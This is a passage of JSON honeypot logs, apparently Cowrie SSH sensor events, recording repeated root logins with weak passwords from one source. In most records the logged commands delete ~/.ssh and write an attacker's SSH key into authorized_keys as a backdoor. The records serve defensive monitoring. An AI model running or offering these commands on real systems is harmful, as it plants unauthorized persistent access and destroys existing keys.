+              """cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"""
+            ],
+            "unknown_commands": [
+              "lockr -ia .ssh"
+            ],
+            "urls": [],
+            "files": [],
+            "uploads": [],
+            "version": "SSH-2.0-libssh_0.12.0",
+            "ttylog": "0100000000000000000000000000000021901c6a0fe206000300000000000000e50100000300000021901c6a9ae206006364207e20262620726d202d7266202e737368202626206d6b646972202e737368202626206563686f20227373682d727361204141414142334e7a6143317963324541414141424a514141415145417244703463756e326c6872344b5568424745375676416377646c6932613864626e72544f72624d7a312b354f37336663424f78384e56625554306255616e555639744a322f3970372b76443045705a33547a2f2b306b5833347541783152562f373547564f6d4e782b394575574f6e764e6f614a65305158787a69496739654c424870674c4d75616b62352b42675446422b724b4a417739753946535444656e677653386858316b4e4653344d6a757830684a4f4b38727663456d5065636a647953594d6236366e796c414b477743454536574551486d64316d55506748774751306857437773516b3133794347504b357736685970357a596b466e766c433868476d643457772b7539376b36706654475455624a6b3134756a7663443969554b5154545759596a49497535506d5575783562735a305234574677644965362b693672424c4173504b67417953564b50524b2b6f52773d3d206d647266636b72223e3e2e7373682f617574686f72697a65645f6b6579732026262063686d6f64202d5220676f3d207e2f2e737368202626206364207e0200000000000000000000000000000021901c6a7ddf0c00",
+            "arch": "linux-x64-lsb",
+            "client_height": null,
+            "client_width": null,
+            "key_fingerprint": null,
+            "kex": {
+              "hassh": "af8223ac9914f509afdadfaf5f7ee94e",
+              "hassh_algorithms": "mlkem768x25519-sha256,mlkem768nistp256-sha256,sntrup761x25519-sha512,sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,ext-info-c,kex-strict-c-v00@openssh.com;chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512;none,zlib@openssh.com",
+              "kex_algorithms": [
+                "mlkem768x25519-sha256",
+                "mlkem768nistp256-sha256",
+                "sntrup761x25519-sha512",
+                "sntrup761x25519-sha512@openssh.com",
+                "curve25519-sha256",
+                "curve25519-sha256@libssh.org",
+                "ecdh-sha2-nistp256",
+                "ecdh-sha2-nistp384",
+                "ecdh-sha2-nistp521",
+                "diffie-hellman-group18-sha512",
+                "diffie-hellman-group16-sha512",
+                "diffie-hellman-group-exchange-sha256",
+                "diffie-hellman-group14-sha256",
+                "ext-info-c",
+                "kex-strict-c-v00@openssh.com"
+              ],
+              "key_algorithms": [
+                "ssh-ed25519",
+                "ecdsa-sha2-nistp521",
+                "ecdsa-sha2-nistp384",
+                "ecdsa-sha2-nistp256",
+                "sk-ssh-ed25519@openssh.com",
+                "sk-ecdsa-sha2-nistp256@openssh.com",
+                "rsa-sha2-512",
+                "rsa-sha2-256"
+              ],
+              "enc_cs": [
+                "chacha20-poly1305@openssh.com",
+                "aes256-gcm@openssh.com",
+                "aes128-gcm@openssh.com",
+                "aes256-ctr",
+                "aes192-ctr",
+                "aes128-ctr"
+              ],
+              "mac_cs": [
+                "hmac-sha2-256-etm@openssh.com",
+                "hmac-sha2-512-etm@openssh.com",
+                "hmac-sha2-256",
+                "hmac-sha2-512"
+              ],
+              "comp_cs": [
+                "none",
+                "zlib@openssh.com"
+              ],
+              "lang_cs": [
+                ""
+              ]
+            },
+            "geo_city": null,
+            "geo_cc": null,
+            "geopoint": null,
+            "geo_asn": 149897,
+            "geo_asn_org": "PT Amanusa Telemedia Mahardika"
+          },
+          "@timestamp": "2026-06-01T00:32:09.000000000+00:00",
+          "fluentd_tag": "stingar.events.cowrie"
+        }
+      },
+      {
+        "_index": "stingar-2026-06-01",
+        "_id": "TpCVgJ4BVhuTze9gyHzV",
+        "_score": 1,
+        "_ignored": [
+          "hp_data.commands.keyword",
+          "hp_data.kex.hassh_algorithms.keyword",
+          "hp_data.ttylog.keyword"
+        ],
+        "_source": {
+          "app": "cowrie",
+          "sensor": {
+            "uuid": "287bcd0281eb46a2817893cd514f3336",
+            "hostname": "vm1223.cloud.azure.com",
+            "tags": {
+              "misc": [
+                ""
+              ]
+            },
+            "asn": ""
+          },
+          "protocol": "ssh",
+          "start_time": "2026-06-01T00:29:12.108134Z",
+          "end_time": "2026-06-01T00:29:19.421300Z",
+          "src_ip": "103.187.165.26",
+          "src_port": 46364,
+          "dst_ip": "74.235.47.28",
+          "dst_port": 2222,
+          "hp_data": {
+            "con_type": "accept",
+            "transport": "tcp",
+            "session": "0bfcf096257d",
+            "credentials": [
+              {
+                "username": "root",
+                "password": "123789",
+                "success": true
+              }
+            ],
+            "commands": [
+              "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+              """cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"""
+            ],
+            "unknown_commands": [
+              "lockr -ia .ssh"
+            ],
+            "urls": [],
+            "files": [],
+            "uploads": [],
+            "version": "SSH-2.0-libssh_0.12.0",
+            "ttylog": "0100000000000000000000000000000021901c6a0fe206000300000000000000e50100000300000021901c6a9ae206006364207e20262620726d202d7266202e737368202626206d6b646972202e737368202626206563686f20227373682d727361204141414142334e7a6143317963324541414141424a514141415145417244703463756e326c6872344b5568424745375676416377646c6932613864626e72544f72624d7a312b354f37336663424f78384e56625554306255616e555639744a322f3970372b76443045705a33547a2f2b306b5833347541783152562f373547564f6d4e782b394575574f6e764e6f614a65305158787a69496739654c424870674c4d75616b62352b42675446422b724b4a417739753946535444656e677653386858316b4e4653344d6a757830684a4f4b38727663456d5065636a647953594d6236366e796c414b477743454536574551486d64316d55506748774751306857437773516b3133794347504b357736685970357a596b466e766c433868476d643457772b7539376b36706654475455624a6b3134756a7663443969554b5154545759596a49497535506d5575783562735a305234574677644965362b693672424c4173504b67417953564b50524b2b6f52773d3d206d647266636b72223e3e2e7373682f617574686f72697a65645f6b6579732026262063686d6f64202d5220676f3d207e2f2e737368202626206364207e0200000000000000000000000000000021901c6a7ddf0c00",
+            "arch": "linux-x64-lsb",
+            "client_height": null,
+            "client_width": null,
+            "key_fingerprint": null,
+            "kex": {
+              "hassh": "af8223ac9914f509afdadfaf5f7ee94e",
+              "hassh_algorithms": "mlkem768x25519-sha256,mlkem768nistp256-sha256,sntrup761x25519-sha512,sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,ext-info-c,kex-strict-c-v00@openssh.com;chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512;none,zlib@openssh.com",
+              "kex_algorithms": [
+                "mlkem768x25519-sha256",
+                "mlkem768nistp256-sha256",
+                "sntrup761x25519-sha512",
+                "sntrup761x25519-sha512@openssh.com",
+                "curve25519-sha256",
+                "curve25519-sha256@libssh.org",
+                "ecdh-sha2-nistp256",
+                "ecdh-sha2-nistp384",
+                "ecdh-sha2-nistp521",
+                "diffie-hellman-group18-sha512",
+                "diffie-hellman-group16-sha512",
+                "diffie-hellman-group-exchange-sha256",
+                "diffie-hellman-group14-sha256",
+                "ext-info-c",
+                "kex-strict-c-v00@openssh.com"
+              ],
+              "key_algorithms": [
+                "ssh-ed25519",
+                "ecdsa-sha2-nistp521",
+                "ecdsa-sha2-nistp384",
+                "ecdsa-sha2-nistp256",
+                "sk-ssh-ed25519@openssh.com",
+                "sk-ecdsa-sha2-nistp256@openssh.com",
+                "rsa-sha2-512",
+                "rsa-sha2-256"
+              ],
+              "enc_cs": [
+                "chacha20-poly1305@openssh.com",
+                "aes256-gcm@openssh.com",
+                "aes128-gcm@openssh.com",
+                "aes256-ctr",
+                "aes192-ctr",
+                "aes128-ctr"
+              ],
+              "mac_cs": [
+                "hmac-sha2-256-etm@openssh.com",
+                "hmac-sha2-512-etm@openssh.com",
+                "hmac-sha2-256",
+                "hmac-sha2-512"
+              ],
+              "comp_cs": [
+                "none",
+                "zlib@openssh.com"
+              ],
+              "lang_cs": [
+                ""
+              ]
+            },
+            "geo_city": null,
+            "geo_cc": null,
+            "geopoint": null,
+            "geo_asn": 149897,
+            "geo_asn_org": "PT Amanusa Telemedia Mahardika"
+          },
+          "@timestamp": "2026-06-01T00:29:19.000000000+00:00",
+          "fluentd_tag": "stingar.events.cowrie"
+        }
+      },
+      {
+        "_index": "stingar-2026-06-01",
+        "_id": "UJCWgJ4BVhuTze9gp3yb",
+        "_score": 1,
+        "_ignored": [
+          "hp_data.commands.keyword",
+          "hp_data.kex.hassh_algorithms.keyword",
+          "hp_data.ttylog.keyword"
+        ],
+        "_source": {
+          "app": "cowrie",
+          "sensor": {
+            "uuid": "287bcd0281eb46a2817893cd514f3336",
+            "hostname": "vm1223.cloud.azure.com",
+            "tags": {
+              "misc": [
+                ""
+              ]
+            },
+            "asn": ""
+          },
+          "protocol": "ssh",
+          "start_time": "2026-06-01T00:30:08.762361Z",
+          "end_time": "2026-06-01T00:30:16.006816Z",
+          "src_ip": "103.187.165.26",
+          "src_port": 58828,
+          "dst_ip": "74.235.47.28",
+          "dst_port": 2222,
+          "hp_data": {
+            "con_type": "accept",
+            "transport": "tcp",
+            "session": "965052e6d572",
+            "credentials": [
+              {
+                "username": "root",
+                "password": "Ss123456",
+                "success": true
+              }
+            ],
+            "commands": [
+              "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+              """cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"""
+            ],
+            "unknown_commands": [
+              "lockr -ia .ssh"
+            ],
+            "urls": [],
+            "files": [],
+            "uploads": [],
+            "version": "SSH-2.0-libssh_0.12.0",
+            "ttylog": "0100000000000000000000000000000021901c6a0fe206000300000000000000e50100000300000021901c6a9ae206006364207e20262620726d202d7266202e737368202626206d6b646972202e737368202626206563686f20227373682d727361204141414142334e7a6143317963324541414141424a514141415145417244703463756e326c6872344b5568424745375676416377646c6932613864626e72544f72624d7a312b354f37336663424f78384e56625554306255616e555639744a322f3970372b76443045705a33547a2f2b306b5833347541783152562f373547564f6d4e782b394575574f6e764e6f614a65305158787a69496739654c424870674c4d75616b62352b42675446422b724b4a417739753946535444656e677653386858316b4e4653344d6a757830684a4f4b38727663456d5065636a647953594d6236366e796c414b477743454536574551486d64316d55506748774751306857437773516b3133794347504b357736685970357a596b466e766c433868476d643457772b7539376b36706654475455624a6b3134756a7663443969554b5154545759596a49497535506d5575783562735a305234574677644965362b693672424c4173504b67417953564b50524b2b6f52773d3d206d647266636b72223e3e2e7373682f617574686f72697a65645f6b6579732026262063686d6f64202d5220676f3d207e2f2e737368202626206364207e0200000000000000000000000000000021901c6a7ddf0c00",
+            "arch": "linux-x64-lsb",
+            "client_height": null,
+            "client_width": null,
+            "key_fingerprint": null,
+            "kex": {
+              "hassh": "af8223ac9914f509afdadfaf5f7ee94e",
+              "hassh_algorithms": "mlkem768x25519-sha256,mlkem768nistp256-sha256,sntrup761x25519-sha512,sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,ext-info-c,kex-strict-c-v00@openssh.com;chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512;none,zlib@openssh.com",
+              "kex_algorithms": [
+                "mlkem768x25519-sha256",
+                "mlkem768nistp256-sha256",
+                "sntrup761x25519-sha512",
+                "sntrup761x25519-sha512@openssh.com",
+                "curve25519-sha256",
+                "curve25519-sha256@libssh.org",
+                "ecdh-sha2-nistp256",
+                "ecdh-sha2-nistp384",
+                "ecdh-sha2-nistp521",
+                "diffie-hellman-group18-sha512",
+                "diffie-hellman-group16-sha512",
+                "diffie-hellman-group-exchange-sha256",
+                "diffie-hellman-group14-sha256",
+                "ext-info-c",
+                "kex-strict-c-v00@openssh.com"
+              ],
+              "key_algorithms": [
+                "ssh-ed25519",
+                "ecdsa-sha2-nistp521",
+                "ecdsa-sha2-nistp384",
+                "ecdsa-sha2-nistp256",
+                "sk-ssh-ed25519@openssh.com",
+                "sk-ecdsa-sha2-nistp256@openssh.com",
+                "rsa-sha2-512",
+                "rsa-sha2-256"
+              ],
+              "enc_cs": [
+                "chacha20-poly1305@openssh.com",
+                "aes256-gcm@openssh.com",
+                "aes128-gcm@openssh.com",
+                "aes256-ctr",
+                "aes192-ctr",
+                "aes128-ctr"
+              ],
+              "mac_cs": [
+                "hmac-sha2-256-etm@openssh.com",
+                "hmac-sha2-512-etm@openssh.com",
+                "hmac-sha2-256",
+                "hmac-sha2-512"
+              ],
+              "comp_cs": [
+                "none",
+                "zlib@openssh.com"
+              ],
+              "lang_cs": [
+                ""
+              ]
+            },
+            "geo_city": null,
+            "geo_cc": null,
+            "geopoint": null,
+            "geo_asn": 149897,
+            "geo_asn_org": "PT Amanusa Telemedia Mahardika"
+          },
+          "@timestamp": "2026-06-01T00:30:16.000000000+00:00",
+          "fluentd_tag": "stingar.events.cowrie"
+        }
+      },
+      {
+        "_index": "stingar-2026-06-01",
+        "_id": "RJCTgJ4BVhuTze9gKHyj",
+        "_score": 1,
+        "_ignored": [
+          "hp_data.commands.keyword",
+          "hp_data.kex.hassh_algorithms.keyword",
+          "hp_data.ttylog.keyword"
+        ],
+        "_source": {
+          "app": "cowrie",
+          "sensor": {
+            "uuid": "287bcd0281eb46a2817893cd514f3336",
+            "hostname": "vm1223.cloud.azure.com",
+            "tags": {
+              "misc": [
+                ""
+              ]
+            },
+            "asn": ""
+          },
+          "protocol": "ssh",
+          "start_time": "2026-06-01T00:26:19.989436Z",
+          "end_time": "2026-06-01T00:26:27.199787Z",
+          "src_ip": "103.187.165.26",
+          "src_port": 51064,
+          "dst_ip": "74.235.47.28",
+          "dst_port": 2222,
+          "hp_data": {
+            "con_type": "accept",
+            "transport": "tcp",
+            "session": "8d8c42ffa789",
+            "credentials": [
+              {
+                "username": "root",
+                "password": "Yy123456",
+                "success": true
+              }
+            ],
+            "commands": [
+              "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+              """cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"""
+            ],
+            "unknown_commands": [
+              "lockr -ia .ssh"
+            ],
+            "urls": [],
+            "files": [],
+            "uploads": [],
+            "version": "SSH-2.0-libssh_0.12.0",
+            "ttylog": "0100000000000000000000000000000021901c6a0fe206000300000000000000e50100000300000021901c6a9ae206006364207e20262620726d202d7266202e737368202626206d6b646972202e737368202626206563686f20227373682d727361204141414142334e7a6143317963324541414141424a514141415145417244703463756e326c6872344b5568424745375676416377646c6932613864626e72544f72624d7a312b354f37336663424f78384e56625554306255616e555639744a322f3970372b76443045705a33547a2f2b306b5833347541783152562f373547564f6d4e782b394575574f6e764e6f614a65305158787a69496739654c424870674c4d75616b62352b42675446422b724b4a417739753946535444656e677653386858316b4e4653344d6a757830684a4f4b38727663456d5065636a647953594d6236366e796c414b477743454536574551486d64316d55506748774751306857437773516b3133794347504b357736685970357a596b466e766c433868476d643457772b7539376b36706654475455624a6b3134756a7663443969554b5154545759596a49497535506d5575783562735a305234574677644965362b693672424c4173504b67417953564b50524b2b6f52773d3d206d647266636b72223e3e2e7373682f617574686f72697a65645f6b6579732026262063686d6f64202d5220676f3d207e2f2e737368202626206364207e0200000000000000000000000000000021901c6a7ddf0c00",
+            "arch": "linux-x64-lsb",
+            "client_height": null,
+            "client_width": null,
+            "key_fingerprint": null,
+            "kex": {
+              "hassh": "af8223ac9914f509afdadfaf5f7ee94e",
+              "hassh_algorithms": "mlkem768x25519-sha256,mlkem768nistp256-sha256,sntrup761x25519-sha512,sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,ext-info-c,kex-strict-c-v00@openssh.com;chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512;none,zlib@openssh.com",
+              "kex_algorithms": [
+                "mlkem768x25519-sha256",
+                "mlkem768nistp256-sha256",
+                "sntrup761x25519-sha512",
+                "sntrup761x25519-sha512@openssh.com",
+                "curve25519-sha256",
+                "curve25519-sha256@libssh.org",
+                "ecdh-sha2-nistp256",
+                "ecdh-sha2-nistp384",
+                "ecdh-sha2-nistp521",
+                "diffie-hellman-group18-sha512",
+                "diffie-hellman-group16-sha512",
+                "diffie-hellman-group-exchange-sha256",
+                "diffie-hellman-group14-sha256",
+                "ext-info-c",
+                "kex-strict-c-v00@openssh.com"
+              ],
+              "key_algorithms": [
+                "ssh-ed25519",
+                "ecdsa-sha2-nistp521",
+                "ecdsa-sha2-nistp384",
+                "ecdsa-sha2-nistp256",
+                "sk-ssh-ed25519@openssh.com",
+                "sk-ecdsa-sha2-nistp256@openssh.com",
+                "rsa-sha2-512",
+                "rsa-sha2-256"
+              ],
+              "enc_cs": [
+                "chacha20-poly1305@openssh.com",
+                "aes256-gcm@openssh.com",
+                "aes128-gcm@openssh.com",
+                "aes256-ctr",
+                "aes192-ctr",
+                "aes128-ctr"
+              ],
+              "mac_cs": [
+                "hmac-sha2-256-etm@openssh.com",
+                "hmac-sha2-512-etm@openssh.com",
+                "hmac-sha2-256",
+                "hmac-sha2-512"
+              ],
+              "comp_cs": [
+                "none",
+                "zlib@openssh.com"
+              ],
+              "lang_cs": [
+                ""
+              ]
+            },
+            "geo_city": null,
+            "geo_cc": null,
+            "geopoint": null,
+            "geo_asn": 149897,
+            "geo_asn_org": "PT Amanusa Telemedia Mahardika"
+          },
+          "@timestamp": "2026-06-01T00:26:27.000000000+00:00",
+          "fluentd_tag": "stingar.events.cowrie"
+        }
+      },
+      {
+        "_index": "stingar-2026-06-01",
+        "_id": "R5CUgJ4BVhuTze9gC3xO",
+        "_score": 1,
+        "_ignored": [
+          "hp_data.commands.keyword",
+          "hp_data.kex.hassh_algorithms.keyword",
+          "hp_data.ttylog.keyword"
+        ],
+        "_source": {
+          "app": "cowrie",
+          "sensor": {
+            "uuid": "287bcd0281eb46a2817893cd514f3336",
+            "hostname": "vm1223.cloud.azure.com",
+            "tags": {
+              "misc": [
+                ""
+              ]
+            },
+            "asn": ""
+          },
+          "protocol": "ssh",
+          "start_time": "2026-06-01T00:27:17.871914Z",
+          "end_time": "2026-06-01T00:27:25.100853Z",
+          "src_ip": "103.187.165.26",
+          "src_port": 43094,
+          "dst_ip": "74.235.47.28",
+          "dst_port": 2222,
+          "hp_data": {
+            "con_type": "accept",
+            "transport": "tcp",
+            "session": "bf8cb5cae22e",
+            "credentials": [
+              {
+                "username": "root",
+                "password": "1234!@#$qwer",
+                "success": true
+              }
+            ],
+            "commands": [
+              "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+              """cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"""
+            ],
+            "unknown_commands": [
+              "lockr -ia .ssh"
+            ],
+            "urls": [],
+            "files": [],
+            "uploads": [],
+            "version": "SSH-2.0-libssh_0.12.0",
+            "ttylog": "0100000000000000000000000000000021901c6a0fe206000300000000000000e50100000300000021901c6a9ae206006364207e20262620726d202d7266202e737368202626206d6b646972202e737368202626206563686f20227373682d727361204141414142334e7a6143317963324541414141424a514141415145417244703463756e326c6872344b5568424745375676416377646c6932613864626e72544f72624d7a312b354f37336663424f78384e56625554306255616e555639744a322f3970372b76443045705a33547a2f2b306b5833347541783152562f373547564f6d4e782b394575574f6e764e6f614a65305158787a69496739654c424870674c4d75616b62352b42675446422b724b4a417739753946535444656e677653386858316b4e4653344d6a757830684a4f4b38727663456d5065636a647953594d6236366e796c414b477743454536574551486d64316d55506748774751306857437773516b3133794347504b357736685970357a596b466e766c433868476d643457772b7539376b36706654475455624a6b3134756a7663443969554b5154545759596a49497535506d5575783562735a305234574677644965362b693672424c4173504b67417953564b50524b2b6f52773d3d206d647266636b72223e3e2e7373682f617574686f72697a65645f6b6579732026262063686d6f64202d5220676f3d207e2f2e737368202626206364207e0200000000000000000000000000000021901c6a7ddf0c00",
+            "arch": "linux-x64-lsb",
+            "client_height": null,
+            "client_width": null,
+            "key_fingerprint": null,
+            "kex": {
+              "hassh": "af8223ac9914f509afdadfaf5f7ee94e",
+              "hassh_algorithms": "mlkem768x25519-sha256,mlkem768nistp256-sha256,sntrup761x25519-sha512,sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,ext-info-c,kex-strict-c-v00@openssh.com;chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512;none,zlib@openssh.com",
+              "kex_algorithms": [
+                "mlkem768x25519-sha256",
+                "mlkem768nistp256-sha256",
+                "sntrup761x25519-sha512",
+                "sntrup761x25519-sha512@openssh.com",
+                "curve25519-sha256",
+                "curve25519-sha256@libssh.org",
+                "ecdh-sha2-nistp256",
+                "ecdh-sha2-nistp384",
+                "ecdh-sha2-nistp521",
+                "diffie-hellman-group18-sha512",
+                "diffie-hellman-group16-sha512",
+                "diffie-hellman-group-exchange-sha256",
+                "diffie-hellman-group14-sha256",
+                "ext-info-c",
+                "kex-strict-c-v00@openssh.com"
+              ],
+              "key_algorithms": [
+                "ssh-ed25519",
+                "ecdsa-sha2-nistp521",
+                "ecdsa-sha2-nistp384",
+                "ecdsa-sha2-nistp256",
+                "sk-ssh-ed25519@openssh.com",
+                "sk-ecdsa-sha2-nistp256@openssh.com",
+                "rsa-sha2-512",
+                "rsa-sha2-256"
+              ],
+              "enc_cs": [
+                "chacha20-poly1305@openssh.com",
+                "aes256-gcm@openssh.com",
+                "aes128-gcm@openssh.com",
+                "aes256-ctr",
+                "aes192-ctr",
+                "aes128-ctr"
+              ],
+              "mac_cs": [
+                "hmac-sha2-256-etm@openssh.com",
+                "hmac-sha2-512-etm@openssh.com",
+                "hmac-sha2-256",
+                "hmac-sha2-512"
+              ],
+              "comp_cs": [
+                "none",
+                "zlib@openssh.com"
+              ],
+              "lang_cs": [
+                ""
+              ]
+            },
+            "geo_city": null,
+            "geo_cc": null,
+            "geopoint": null,
+            "geo_asn": 149897,
+            "geo_asn_org": "PT Amanusa Telemedia Mahardika"
+          },
+          "@timestamp": "2026-06-01T00:27:25.000000000+00:00",
+          "fluentd_tag": "stingar.events.cowrie"
+        }
+      }
+    ]
+  }
+}
